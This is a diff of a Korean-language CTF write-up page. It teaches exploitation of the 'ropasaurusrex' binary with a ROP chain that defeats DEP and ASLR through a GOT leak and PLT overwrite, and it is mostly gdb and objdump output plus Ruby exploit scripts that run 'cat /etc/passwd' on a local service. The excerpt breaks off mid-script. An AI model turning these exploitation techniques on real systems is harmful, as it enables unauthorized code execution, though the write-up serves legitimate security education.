+</code></pre></div><p>그게 <code>read()</code>의 반환 주소(<code>0x43434343</code>)에서 크래시를 일으켰고 명령어를 메모리 <code>0x08049530</code>에 썼다는 걸 확인해라:<div class="highlight"><pre><code class="language-sh" data-lang="sh"><span class="gp">$ </span>gdb --quiet ./ropasaurusrex core
+<span class="o">[</span>...]
 Program terminated with signal 11, Segmentation fault.
 <span class="c">#0  0x43434343 in ?? ()</span>
 <span class="o">(</span>gdb<span class="o">)</span> x/s 0x08049530
-0x8049530:       <span class="s2">&quot;cat /etc/passwd&quot;</span>
-</code></pre></div><p>완벽하다!<h3><a id="running-it"></a>실행하기</h3><p>이제 우린 <code>cat /etc/passwd</code>를 메모리에 썼고, <code>system()</code>을 호출해서 저 주소를 가리키면 된다. 거의 다 됐다. ASLR이 적용되지 않았다면 쉽다. 실행 파일에는 libc가 링크되어 있다:<div class="highlight"><pre><code class="language-sh" data-lang="sh"><span class="nv">$ </span>ldd ./ropasaurusrex
+0x8049530:       <span class="s2">"cat /etc/passwd"</span>
+</code></pre></div><p>완벽하다!<h3><a id="running-it"></a>실행하기</h3><p>이제 우린 <code>cat /etc/passwd</code>를 메모리에 썼고, <code>system()</code>을 호출해서 저 주소를 가리키면 된다. 거의 다 됐다. ASLR이 적용되지 않았다면 쉽다. 실행 파일에는 libc가 링크되어 있다:<div class="highlight"><pre><code class="language-sh" data-lang="sh"><span class="gp">$ </span>ldd ./ropasaurusrex
         linux-gate.so.1 <span class="o">=</span>&gt;  <span class="o">(</span>0xb7703000<span class="o">)</span>
         libc.so.6 <span class="o">=</span>&gt; /lib/i686/cmov/libc.so.6 <span class="o">(</span>0xb75aa000<span class="o">)</span>
         /lib/ld-linux.so.2 <span class="o">(</span>0xb7704000<span class="o">)</span>
-</code></pre></div><p>그리고 <code>libc.so.6</code>엔 <code>system()</code> 함수가 포함되어 있다:<div class="highlight"><pre><code class="language-sh" data-lang="sh"><span class="nv">$ </span>objdump -T /lib/i686/cmov/libc.so.6 <span class="p">|</span> grep system
-000f5470 g    DF .text  <span class="m">00000042</span>  GLIBC_2.0   svcerr_systemerr
-<span class="m">00039450</span> g    DF .text  0000007d  GLIBC_PRIVATE __libc_system
-<span class="m">00039450</span>  w   DF .text  0000007d  GLIBC_2.0   system
-</code></pre></div><p>디버거를 통해 ropasaurusrex에서 로드된 <code>system()</code> 주소를 알아낼 수 있다:<div class="highlight"><pre><code class="language-sh" data-lang="sh"><span class="nv">$ </span>gdb --quiet ./ropasaurusrex core
-<span class="o">[</span>...<span class="o">]</span>
+</code></pre></div><p>그리고 <code>libc.so.6</code>엔 <code>system()</code> 함수가 포함되어 있다:<div class="highlight"><pre><code class="language-sh" data-lang="sh"><span class="gp">$ </span>objdump -T /lib/i686/cmov/libc.so.6 | grep system
+000f5470 g    DF .text  00000042  GLIBC_2.0   svcerr_systemerr
+00039450 g    DF .text  0000007d  GLIBC_PRIVATE __libc_system
+00039450  w   DF .text  0000007d  GLIBC_2.0   system
+</code></pre></div><p>디버거를 통해 ropasaurusrex에서 로드된 <code>system()</code> 주소를 알아낼 수 있다:<div class="highlight"><pre><code class="language-sh" data-lang="sh"><span class="gp">$ </span>gdb --quiet ./ropasaurusrex core
+<span class="o">[</span>...]
 Program terminated with signal 11, Segmentation fault.
 <span class="c">#0  0x43434343 in ?? ()</span>
 <span class="o">(</span>gdb<span class="o">)</span> x/x system
@@ -213,7 +215,7 @@ Program terminated with signal 11, Segmentation fault.
 +----------------------+ &lt;-- system()의 스택 프레임 시작
 |      void *arg       | - buffer, 0x08049530
 +----------------------+
-|   [return address]   | - &#39;system&#39;이 반환되는 주소
+|   [return address]   | - 'system'이 반환되는 주소
 +----------------------+
 |         ...          | - 상관 없다, system() 지역 변수를 위해 사용할 것이다.
 +----------------------+
@@ -284,7 +286,7 @@ Program terminated with signal 11, Segmentation fault.
 +----------------------+
 |        int fd        | &lt;-- 스택 포인터
 +----------------------+
-| [address of &quot;pppr&quot;]  |
+| [address of "pppr"]  |
 +----------------------+
 
 +----------------------+
@@ -311,7 +313,7 @@ Program terminated with signal 11, Segmentation fault.
 +----------------------+
 |        int fd        |
 +----------------------+
-| [address of &quot;pppr&quot;]  |
+| [address of "pppr"]  |
 +----------------------+
 
 +----------------------+
@@ -338,14 +340,14 @@ Program terminated with signal 11, Segmentation fault.
 +----------------------+
 |        int fd        |
 +----------------------+
-| [address of &quot;pppr&quot;]  |
+| [address of "pppr"]  |
 +----------------------+
 
 +----------------------+
 |         ...          |
 +----------------------+
-</code></pre></div><p><code>pop/pop/pop/ret</code>은 <code>objdump</code>를 이용하면 어렵지 않게 찾을 수 있다:<div class="highlight"><pre><code class="language-sh" data-lang="sh"><span class="nv">$ </span>objdump -d ./ropasaurusrex <span class="p">|</span> egrep <span class="s1">&#39;pop|ret&#39;</span>
-<span class="o">[</span>...<span class="o">]</span>
+</code></pre></div><p><code>pop/pop/pop/ret</code>은 <code>objdump</code>를 이용하면 어렵지 않게 찾을 수 있다:<div class="highlight"><pre><code class="language-sh" data-lang="sh"><span class="gp">$ </span>objdump -d ./ropasaurusrex | egrep <span class="s1">'pop|ret'</span>
+<span class="o">[</span>...]
  80484b5:       5b                      pop    ebx
  80484b6:       5e                      pop    esi
  80484b7:       5f                      pop    edi
@@ -372,18 +374,18 @@ Program terminated with signal 11, Segmentation fault.
 +----------------------+
 |        int fd        | - 0 (stdin)
 +----------------------+
-| [address of &quot;pppr&quot;]  | - 0x080484b6
+| [address of "pppr"]  | - 0x080484b6
 +----------------------+
 
 +----------------------+
 |         ...          |
 +----------------------+
-</code></pre></div><p>원격 서버에서 보내는 걸 받기 위해 <code>s.read()</code>를 익스플로잇 마지막에 추가하자. 현재 익스플로잇은 다음과 같다:<div class="highlight"><pre><code class="language-ruby" data-lang="ruby"><span class="nb">require</span> <span class="s1">&#39;socket&#39;</span>
+</code></pre></div><p>원격 서버에서 보내는 걸 받기 위해 <code>s.read()</code>를 익스플로잇 마지막에 추가하자. 현재 익스플로잇은 다음과 같다:<div class="highlight"><pre><code class="language-ruby" data-lang="ruby"><span class="nb">require</span> <span class="s1">'socket'</span>
 
-<span class="n">s</span> <span class="o">=</span> <span class="no">TCPSocket</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="s2">&quot;localhost&quot;</span><span class="p">,</span> <span class="mi">4444</span><span class="p">)</span>
+<span class="n">s</span> <span class="o">=</span> <span class="no">TCPSocket</span><span class="p">.</span><span class="nf">new</span><span class="p">(</span><span class="s2">"localhost"</span><span class="p">,</span> <span class="mi">4444</span><span class="p">)</span>
 
-<span class="c1"># The command we&#39;ll run</span>
-<span class="n">cmd</span> <span class="o">=</span> <span class="no">ARGV</span><span class="o">[</span><span class="mi">0</span><span class="o">]</span> <span class="o">+</span> <span class="s2">&quot;</span><span class="se">\0</span><span class="s2">&quot;</span>
+<span class="c1"># The command we'll run</span>
+<span class="n">cmd</span> <span class="o">=</span> <span class="no">ARGV</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">+</span> <span class="s2">"</span><span class="se">\0</span><span class="s2">"</span>
 
 <span class="c1"># From objdump -x</span>
 <span class="n">buf</span> <span class="o">=</span> <span class="mh">0x08049530</span>
@@ -392,50 +394,50 @@ Program terminated with signal 11, Segmentation fault.
 <span class="n">read_addr</span> <span class="o">=</span> <span class="mh">0x0804832C</span>
 <span class="c1"># From objdump -D ./ropasaurusrex | grep write</span>
 <span class="n">write_addr</span> <span class="o">=</span> <span class="mh">0x0804830C</span>
-<span class="c1"># From gdb, &quot;x/x system&quot;</span>
+<span class="c1"># From gdb, "x/x system"</span>
 <span class="n">system_addr</span> <span class="o">=</span> <span class="mh">0xb7ec2450</span>
-<span class="c1"># From objdump, &quot;pop/pop/pop/ret&quot;</span>
+<span class="c1"># From objdump, "pop/pop/pop/ret"</span>
 <span class="n">pppr_addr</span> <span class="o">=</span> <span class="mh">0x080484b6</span>
 
 <span class="c1"># Generate the payload</span>
-<span class="n">payload</span> <span class="o">=</span> <span class="s2">&quot;A&quot;</span><span class="o">*</span><span class="mi">140</span> <span class="o">+</span>
-  <span class="o">[</span>
-    <span class="c1"># system()&#39;s stack frame</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="s2">"A"</span><span class="o">*</span><span class="mi">140</span> <span class="o">+</span>
+  <span class="p">[</span>
+    <span class="c1"># system()'s stack frame</span>
     <span class="n">buf</span><span class="p">,</span>         <span class="c1"># writable memory (cmd buf)</span>
-    <span class="mh">0x44444444</span><span class="p">,</span>  <span class="c1"># system()&#39;s return address</span>
+    <span class="mh">0x44444444</span><span class="p">,</span>  <span class="c1"># system()'s return address</span>
 
-    <span class="c1"># pop/pop/pop/ret&#39;s stack frame</span>
-    <span class="n">system_addr</span><span class="p">,</span> <span class="c1"># pop/pop/pop/ret&#39;s return address</span>
+    <span class="c1"># pop/pop/pop/ret's stack frame</span>
+    <span class="n">system_addr</span><span class="p">,</span> <span class="c1"># pop/pop/pop/ret's return address</span>
 
-    <span class="c1"># read()&#39;s stack frame</span>
-    <span class="n">cmd</span><span class="o">.</span><span class="n">length</span><span class="p">,</span>  <span class="c1"># number of bytes</span>
+    <span class="c1"># read()'s stack frame</span>
+    <span class="n">cmd</span><span class="p">.</span><span class="nf">length</span><span class="p">,</span>  <span class="c1"># number of bytes</span>
     <span class="n">buf</span><span class="p">,</span>         <span class="c1"># writable memory (cmd buf)</span>
     <span class="mi">0</span><span class="p">,</span>           <span class="c1"># stdin</span>
-    <span class="n">pppr_addr</span><span class="p">,</span>   <span class="c1"># read()&#39;s return address</span>
+    <span class="n">pppr_addr</span><span class="p">,</span>   <span class="c1"># read()'s return address</span>
 
     <span class="n">read_addr</span> <span class="c1"># Overwrite the original return</span>
-  <span class="o">].</span><span class="n">reverse</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s2">&quot;I*&quot;</span><span class="p">)</span> <span class="c1"># Convert a series of &#39;ints&#39; to a string</span>
+  <span class="p">].</span><span class="nf">reverse</span><span class="p">.</span><span class="nf">pack</span><span class="p">(</span><span class="s2">"I*"</span><span class="p">)</span> <span class="c1"># Convert a series of 'ints' to a string</span>
 
-<span class="c1"># Write the &#39;exploit&#39; payload</span>
-<span class="n">s</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="c1"># Write the 'exploit' payload</span>
+<span class="n">s</span><span class="p">.</span><span class="nf">write</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
 
 <span class="c1"># When our payload calls read() the first time, this is read</span>
-<span class="n">s</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">cmd</span><span class="p">)</span>
+<span class="n">s</span><span class="p">.</span><span class="nf">write</span><span class="p">(</span><span class="n">cmd</span><span class="p">)</span>
 
 <span class="c1"># Read the response from the command and print it to the screen</span>
-<span class="nb">puts</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">read</span><span class="p">)</span>
+<span class="nb">puts</span><span class="p">(</span><span class="n">s</span><span class="p">.</span><span class="nf">read</span><span class="p">)</span>
 
 <span class="c1"># Clean up</span>
-<span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
-</code></pre></div><p>그리고 실행하게 되면, 예상대로 나온다:<div class="highlight"><pre><code class="language-sh" data-lang="sh"><span class="nv">$ </span>ruby sploit.rb <span class="s2">&quot;cat /etc/passwd&quot;</span>
+<span class="n">s</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
+</code></pre></div><p>그리고 실행하게 되면, 예상대로 나온다:<div class="highlight"><pre><code class="language-sh" data-lang="sh"><span class="gp">$ </span>ruby sploit.rb <span class="s2">"cat /etc/passwd"</span>
 root:x:0:0:root:/root:/bin/bash
 daemon:x:1:1:daemon:/usr/sbin:/bin/sh
 bin:x:2:2:bin:/bin:/bin/sh
 ...
-</code></pre></div><p>그리고 <a href="https://en.wikipedia.org/wiki/Core_dump">코어 덤프</a>를 보면, 예상한 대로 <code>0x44444444</code>에서 크래시를 일으킨다.<p>끝났다, 그렇지?<p>실은 틀렸다!<p>이 익스플로잇은 내 테스트 기기에서 완벽하게 작동하지만, ASLR이 적용되었다면 실패한다:<div class="highlight"><pre><code class="language-sh" data-lang="sh"><span class="nv">$ </span>sudo sysctl -w kernel.randomize_va_space<span class="o">=</span>1
+</code></pre></div><p>그리고 <a href="https://en.wikipedia.org/wiki/Core_dump">코어 덤프</a>를 보면, 예상한 대로 <code>0x44444444</code>에서 크래시를 일으킨다.<p>끝났다, 그렇지?<p>실은 틀렸다!<p>이 익스플로잇은 내 테스트 기기에서 완벽하게 작동하지만, ASLR이 적용되었다면 실패한다:<div class="highlight"><pre><code class="language-sh" data-lang="sh"><span class="gp">$ </span>sudo sysctl -w kernel.randomize_va_space<span class="o">=</span>1
 kernel.randomize_va_space <span class="o">=</span> 1
-ron@debian-x86 ~ <span class="nv">$ </span>ruby sploit.rb <span class="s2">&quot;cat /etc/passwd&quot;</span>
-</code></pre></div><p>여기서부터 조금 더 복잡해진다. 가보자!<h2><a id="what-is-aslr"></a>ASLR이 뭐야?</h2><p>ASLR&mdash;주소 공간 레이아웃 불규칙화(address space layout randomization)&mdash;은 현대 시스템(FreeBSD는 제외)에 구현된 방어 기법으로, 라이브러리가 로드 되는 주소를 불규칙화 한다. 그 예로, ropasaurusrex를 두 번 실행하고 <code>system()</code>의 주소를 알아내 보자:<div class="highlight"><pre><code class="language-sh" data-lang="sh">ron@debian-x86 ~ <span class="nv">$ </span>perl -e <span class="s1">&#39;printf &quot;A&quot;x1000&#39;</span> <span class="p">|</span> ./ropasaurusrex
+ron@debian-x86 ~ <span class="nv">$ </span>ruby sploit.rb <span class="s2">"cat /etc/passwd"</span>
+</code></pre></div><p>여기서부터 조금 더 복잡해진다. 가보자!<h2><a id="what-is-aslr"></a>ASLR이 뭐야?</h2><p>ASLR&mdash;주소 공간 레이아웃 불규칙화(address space layout randomization)&mdash;은 현대 시스템(FreeBSD는 제외)에 구현된 방어 기법으로, 라이브러리가 로드 되는 주소를 불규칙화 한다. 그 예로, ropasaurusrex를 두 번 실행하고 <code>system()</code>의 주소를 알아내 보자:<div class="highlight"><pre><code class="language-sh" data-lang="sh">ron@debian-x86 ~ <span class="nv">$ </span>perl -e <span class="s1">'printf "A"x1000'</span> | ./ropasaurusrex
 Segmentation fault <span class="o">(</span>core dumped<span class="o">)</span>
 ron@debian-x86 ~ <span class="nv">$ </span>gdb ./ropasaurusrex core
 Program terminated with signal 11, Segmentation fault.
@@ -443,29 +445,29 @@ Program terminated with signal 11, Segmentation fault.
 <span class="o">(</span>gdb<span class="o">)</span> x/x system
 0xb766e450 &lt;system&gt;:    0x890cec83
 
-ron@debian-x86 ~ <span class="nv">$ </span>perl -e <span class="s1">&#39;printf &quot;A&quot;x1000&#39;</span> <span class="p">|</span> ./ropasaurusrex
+ron@debian-x86 ~ <span class="nv">$ </span>perl -e <span class="s1">'printf "A"x1000'</span> | ./ropasaurusrex
 Segmentation fault <span class="o">(</span>core dumped<span class="o">)</span>
 ron@debian-x86 ~ <span class="nv">$ </span>gdb ./ropasaurusrex core
 Program terminated with signal 11, Segmentation fault.
 <span class="c">#0  0x41414141 in ?? ()</span>
 <span class="o">(</span>gdb<span class="o">)</span> x/x system
 0xb76a7450 &lt;system&gt;:    0x890cec83
-</code></pre></div><p><code>system()</code>의 주소가 <code>0xb766e450</code>에서 <code>0xb76a7450</code>으로 바뀐 것을 보라. 이게 문제다!<h2><a id="defeating-aslr"></a>ASLR 정복</h2><p>그래서, 뭘 해야 할까? 사실, 바이너리 자체는 ASLR이 적용되지 않아서, 유용하게도 거기 있는 모든 주소는 그대로 머물러 있다고 믿을 수 있다. 아주 중요하게도, 재배치(relocation) 테이블은 같은 주소에 남아있다:<div class="highlight"><pre><code class="language-sh" data-lang="sh"><span class="nv">$ </span>objdump -R ./ropasaurusrex
+</code></pre></div><p><code>system()</code>의 주소가 <code>0xb766e450</code>에서 <code>0xb76a7450</code>으로 바뀐 것을 보라. 이게 문제다!<h2><a id="defeating-aslr"></a>ASLR 정복</h2><p>그래서, 뭘 해야 할까? 사실, 바이너리 자체는 ASLR이 적용되지 않아서, 유용하게도 거기 있는 모든 주소는 그대로 머물러 있다고 믿을 수 있다. 아주 중요하게도, 재배치(relocation) 테이블은 같은 주소에 남아있다:<div class="highlight"><pre><code class="language-sh" data-lang="sh"><span class="gp">$ </span>objdump -R ./ropasaurusrex
 
 ./ropasaurusrex:     file format elf32-i386
 
 DYNAMIC RELOCATION RECORDS
 OFFSET   TYPE              VALUE
-<span class="m">08049600</span> R_386_GLOB_DAT    __gmon_start__
-<span class="m">08049610</span> R_386_JUMP_SLOT   __gmon_start__
-<span class="m">08049614</span> R_386_JUMP_SLOT   write
-<span class="m">08049618</span> R_386_JUMP_SLOT   __libc_start_main
+08049600 R_386_GLOB_DAT    __gmon_start__
+08049610 R_386_JUMP_SLOT   __gmon_start__
+08049614 R_386_JUMP_SLOT   write
+08049618 R_386_JUMP_SLOT   __libc_start_main
 0804961c R_386_JUMP_SLOT   <span class="nb">read</span>
-</code></pre></div><p>이렇게 <code>read()</code>와 <code>write()</code>의 주소&mdash;바이너리 안에 있는&mdash;를 알게 되었다. 이게 뭘 의미하느냐? 바이너리가 실행 중일 때 이들의 값을 살펴보자:<div class="highlight"><pre><code class="language-sh" data-lang="sh"><span class="nv">$ </span>gdb ./ropasaurusrex
+</code></pre></div><p>이렇게 <code>read()</code>와 <code>write()</code>의 주소&mdash;바이너리 안에 있는&mdash;를 알게 되었다. 이게 뭘 의미하느냐? 바이너리가 실행 중일 때 이들의 값을 살펴보자:<div class="highlight"><pre><code class="language-sh" data-lang="sh"><span class="gp">$ </span>gdb ./ropasaurusrex
 <span class="o">(</span>gdb<span class="o">)</span> run
 ^C
 Program received signal SIGINT, Interrupt.
-0xb7fe2424 in __kernel_vsyscall <span class="o">()</span>
+0xb7fe2424 <span class="k">in </span>__kernel_vsyscall <span class="o">()</span>
 <span class="o">(</span>gdb<span class="o">)</span> x/x 0x0804961c
 0x804961c:      0xb7f48110
 <span class="o">(</span>gdb<span class="o">)</span> print <span class="nb">read</span>
@@ -491,7 +493,7 @@ Program received signal SIGINT, Interrupt.
 +----------------------+
 |        int fd        | - 0 (stdin)
 +----------------------+
-| [address of &quot;pppr&quot;]  |
+| [address of "pppr"]  |
 +----------------------+
 
 +----------------------+ &lt;-- pop/pop/pop/ret의 프레임 [4]
@@ -505,7 +507,7 @@ Program received signal SIGINT, Interrupt.
 +----------------------+
 |        int fd        | - 1 (stdout)
 +----------------------+
-| [address of &quot;pppr&quot;]  |
+| [address of "pppr"]  |
 +----------------------+
 
 +----------------------+ &lt;-- pop/pop/pop/ret의 프레임 [2]
@@ -519,7 +521,7 @@ Program received signal SIGINT, Interrupt.
 +----------------------+
 |        int fd        | - 0 (stdin)
 +----------------------+
-| [address of &quot;pppr&quot;]  |
+| [address of "pppr"]  |
 +----------------------+
 
 +----------------------+
@@ -527,12 +529,12 @@ Program received signal SIGINT, Interrupt.
 +----------------------+
 </code></pre></div><p>오 이런, 이게 대체 뭐야?<p>바닥에서 시작해서 올라가자! 말하기 쉽게 각 프레임에 숫자를 붙였다.<p>프레임 [1]은 전에 본 것이다. <code>cmd</code>를 쓸 수 있는 메모리에 기록한다. 프레임 [2]는 <code>read()</code>를 정리할 표준적인 <code>pop/pop/pop/ret</code>을 사용한다.<p>프레임 [3]은 <code>write()</code>를 사용해 소켓에 <code>read()</code> 주소를 쓴다. 프레임 [4]는 <code>write()</code> 후 정리할 표준적인 <code>pop/pop/pop/ret</code>을 사용한다.<p>프레임 [5]는 소켓을 통해 다른 주소를 읽고 그걸 메모리에 쓴다. 이 주소는 <code>system()</code> 호출 주소가 될 것이다. 이걸 메모리에 쓰는 게 작동하는 이유는 <code>read()</code>가 호출되는 방식 때문이다. 우리가 gdb (<code>0x0804832C</code>)에서 써 왔던 <code>read()</code> 호출 부분을 보면 이렇다:<div class="highlight"><pre><code class="language-sh" data-lang="sh"><span class="o">(</span>gdb<span class="o">)</span> x/i 0x0804832C
 0x804832c &lt;<span class="nb">read</span>@plt&gt;:   jmp    DWORD PTR ds:0x804961c
-</code></pre></div><p><code>read()</code>는 사실 간접적인 점프로 구현되어 있다! 그러니 <code>ds:0x804961c</code>의 값이 무엇이든 이걸 바꿔도 그리로 점프하게 되고, 결국 우린 어디로든 점프할 수 있게 된다! 그래서 프레임 [3]에서 메모리로부터 주소를 읽고 (<code>read()</code>의 실제 주소를 얻기 위해) 프레임 [5]에서 그 주소에 새 주소를 쓰는 것이다.<p>프레임 [6]은 표준적인 <code>pop/pop/pop/ret</code> 구조지만 약간 다르다: <code>pop/pop/pop/ret</code>의 반환 주소가 실제론 <code>read()</code>의 <code>.plt</code> 엔트리인 <code>0x804832c</code>다. <code>read()</code>의 <code>.plt</code> 엔트리를 <code>system()</code>으로 덮어쓰기 때문에, 이 호출은 실제로 <code>system()</code>으로 가게 된다!<h2><a id="final-code"></a>최종 코드</h2><p>휴! 꽤 복잡했다. DEP와 ASLR을 모두 우회하며 ropasaurusrex의 익스플로잇을 모두 구현한 코드다:<div class="highlight"><pre><code class="language-ruby" data-lang="ruby"><span class="nb">require</span> <span class="s1">&#39;socket&#39;</span>
+</code></pre></div><p><code>read()</code>는 사실 간접적인 점프로 구현되어 있다! 그러니 <code>ds:0x804961c</code>의 값이 무엇이든 이걸 바꿔도 그리로 점프하게 되고, 결국 우린 어디로든 점프할 수 있게 된다! 그래서 프레임 [3]에서 메모리로부터 주소를 읽고 (<code>read()</code>의 실제 주소를 얻기 위해) 프레임 [5]에서 그 주소에 새 주소를 쓰는 것이다.<p>프레임 [6]은 표준적인 <code>pop/pop/pop/ret</code> 구조지만 약간 다르다: <code>pop/pop/pop/ret</code>의 반환 주소가 실제론 <code>read()</code>의 <code>.plt</code> 엔트리인 <code>0x804832c</code>다. <code>read()</code>의 <code>.plt</code> 엔트리를 <code>system()</code>으로 덮어쓰기 때문에, 이 호출은 실제로 <code>system()</code>으로 가게 된다!<h2><a id="final-code"></a>최종 코드</h2><p>휴! 꽤 복잡했다. DEP와 ASLR을 모두 우회하며 ropasaurusrex의 익스플로잇을 모두 구현한 코드다:<div class="highlight"><pre><code class="language-ruby" data-lang="ruby"><span class="nb">require</span> <span class="s1">'socket'</span>
 
-<span class="n">s</span> <span class="o">=</span> <span class="no">TCPSocket</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="s2">&quot;localhost&quot;</span><span class="p">,</span> <span class="mi">4444</span><span class="p">)</span>
+<span class="n">s</span> <span class="o">=</span> <span class="no">TCPSocket</span><span class="p">.</span><span class="nf">new</span><span class="p">(</span><span class="s2">"localhost"</span><span class="p">,</span> <span class="mi">4444</span><span class="p">)</span>
 
-<span class="c1"># The command we&#39;ll run</span>
-<span class="n">cmd</span> <span class="o">=</span> <span class="no">ARGV</span><span class="o">[</span><span class="mi">0</span><span class="o">]</span> <span class="o">+</span> <span class="s2">&quot;</span><span class="se">\0</span><span class="s2">&quot;</span>
+<span class="c1"># The command we'll run</span>
+<span class="n">cmd</span> <span class="o">=</span> <span class="no">ARGV</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">+</span> <span class="s2">"</span><span class="se">\0</span><span class="s2">"</span>
 
 <span class="c1"># From objdump -x</span>
 <span class="n">buf</span> <span class="o">=</span> <span class="mh">0x08049530</span>
@@ -541,12 +543,12 @@ Program received signal SIGINT, Interrupt.
 <span class="n">read_addr</span> <span class="o">=</span> <span class="mh">0x0804832C</span>
 <span class="c1"># From objdump -D ./ropasaurusrex | grep write</span>
 <span class="n">write_addr</span> <span class="o">=</span> <span class="mh">0x0804830C</span>
-<span class="c1"># From gdb, &quot;x/x system&quot;</span>
+<span class="c1"># From gdb, "x/x system"</span>
 <span class="n">system_addr</span> <span class="o">=</span> <span class="mh">0xb7ec2450</span>
-<span class="c1"># Fram objdump, &quot;pop/pop/pop/ret&quot;</span>
+<span class="c1"># Fram objdump, "pop/pop/pop/ret"</span>
 <span class="n">pppr_addr</span> <span class="o">=</span> <span class="mh">0x080484b6</span>
 
-<span class="c1"># The location where read()&#39;s .plt entry is</span>
+<span class="c1"># The location where read()'s .plt entry is</span>
 <span class="n">read_addr_ptr</span> <span class="o">=</span> <span class="mh">0x0804961c</span>
 
 <span class="c1"># The difference between read() and system()</span>
@@ -556,86 +558,86 @@ Program received signal SIGINT, Interrupt.
 <span class="n">read_system_diff</span> <span class="o">=</span> <span class="mh">0x85cc0</span>
 
 <span class="c1"># Generate the payload</span>
-<span class="n">payload</span> <span class="o">=</span> <span class="s2">&quot;A&quot;</span><span class="o">*</span><span class="mi">140</span> <span class="o">+</span>
-  <span class="o">[</span>
-    <span class="c1"># system()&#39;s stack frame</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="s2">"A"</span><span class="o">*</span><span class="mi">140</span> <span class="o">+</span>
+  <span class="p">[</span>
+    <span class="c1"># system()'s stack frame</span>
     <span class="n">buf</span><span class="p">,</span>         <span class="c1"># writable memory (cmd buf)</span>
-    <span class="mh">0x44444444</span><span class="p">,</span>  <span class="c1"># system()&#39;s return address</span>
+    <span class="mh">0x44444444</span><span class="p">,</span>  <span class="c1"># system()'s return address</span>
 
-    <span class="c1"># pop/pop/pop/ret&#39;s stack frame</span>
+    <span class="c1"># pop/pop/pop/ret's stack frame</span>
     <span class="c1"># Note that this calls read_addr, which is overwritten by a pointer</span>
     <span class="c1"># to system() in the previous stack frame</span>
     <span class="n">read_addr</span><span class="p">,</span>   <span class="c1"># (this will become system())</span>
 
-    <span class="c1"># second read()&#39;s stack frame</span>
+    <span class="c1"># second read()'s stack frame</span>
     <span class="c1"># This reads the address of system() from the socket and overwrites</span>
-    <span class="c1"># read()&#39;s .plt entry with it, so calls to read() end up going to</span>
+    <span class="c1"># read()'s .plt entry with it, so calls to read() end up going to</span>
     <span class="c1"># system()</span>
     <span class="mi">4</span><span class="p">,</span>           <span class="c1"># length of an address</span>
-    <span class="n">read_addr_ptr</span><span class="p">,</span> <span class="c1"># address of read()&#39;s .plt entry</span>
+    <span class="n">read_addr_ptr</span><span class="p">,</span> <span class="c1"># address of read()'s .plt entry</span>
     <span class="mi">0</span><span class="p">,</span>           <span class="c1"># stdin</span>
-    <span class="n">pppr_addr</span><span class="p">,</span>   <span class="c1"># read()&#39;s return address</span>
+    <span class="n">pppr_addr</span><span class="p">,</span>   <span class="c1"># read()'s return address</span>
 
-    <span class="c1"># pop/pop/pop/ret&#39;s stack frame</span>
+    <span class="c1"># pop/pop/pop/ret's stack frame</span>
     <span class="n">read_addr</span><span class="p">,</span>
 
-    <span class="c1"># write()&#39;s stack frame</span>
+    <span class="c1"># write()'s stack frame</span>
     <span class="c1"># This frame gets the address of the read() function from the .plt</span>
     <span class="c1"># entry and writes to to stdout</span>
     <span class="mi">4</span><span class="p">,</span>           <span class="c1"># length of an address</span>
-    <span class="n">read_addr_ptr</span><span class="p">,</span> <span class="c1"># address of read()&#39;s .plt entry</span>
+    <span class="n">read_addr_ptr</span><span class="p">,</span> <span class="c1"># address of read()'s .plt entry</span>
     <span class="mi">1</span><span class="p">,</span>           <span class="c1"># stdout</span>
     <span class="n">pppr_addr</span><span class="p">,</span>   <span class="c1"># retrurn address</span>
 
-    <span class="c1"># pop/pop/pop/ret&#39;s stack frame</span>
+    <span class="c1"># pop/pop/pop/ret's stack frame</span>
     <span class="n">write_addr</span><span class="p">,</span>
 
-    <span class="c1"># read()&#39;s stack frame</span>
+    <span class="c1"># read()'s stack frame</span>
     <span class="c1"># This reads the command we want to run from the socket and puts it</span>
-    <span class="c1"># in our writable &quot;buf&quot;</span>
-    <span class="n">cmd</span><span class="o">.</span><span class="n">length</span><span class="p">,</span>  <span class="c1"># number of bytes</span>
+    <span class="c1"># in our writable "buf"</span>
+    <span class="n">cmd</span><span class="p">.</span><span class="nf">length</span><span class="p">,</span>  <span class="c1"># number of bytes</span>
     <span class="n">buf</span><span class="p">,</span>         <span class="c1"># writable memory (cmd buf)</span>
     <span class="mi">0</span><span class="p">,</span>           <span class="c1"># stdin</span>
-    <span class="n">pppr_addr</span><span class="p">,</span>   <span class="c1"># read()&#39;s return address</span>
+    <span class="n">pppr_addr</span><span class="p">,</span>   <span class="c1"># read()'s return address</span>
 
     <span class="n">read_addr</span> <span class="c1"># Overwrite the original return</span>
-  <span class="o">].</span><span class="n">reverse</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s2">&quot;I*&quot;</span><span class="p">)</span> <span class="c1"># Convert a series of &#39;ints&#39; to a string</span>
+  <span class="p">].</span><span class="nf">reverse</span><span class="p">.</span><span class="nf">pack</span><span class="p">(</span><span class="s2">"I*"</span><span class="p">)</span> <span class="c1"># Convert a series of 'ints' to a string</span>
 
-<span class="c1"># Write the &#39;exploit&#39; payload</span>
-<span class="n">s</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="c1"># Write the 'exploit' payload</span>
+<span class="n">s</span><span class="p">.</span><span class="nf">write</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
 
 <span class="c1"># When our payload calls read() the first time, this is read</span>
-<span class="n">s</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">cmd</span><span class="p">)</span>
+<span class="n">s</span><span class="p">.</span><span class="nf">write</span><span class="p">(</span><span class="n">cmd</span><span class="p">)</span>
 
 <span class="c1"># Get the result of the first read() call, which is the actual address of read</span>
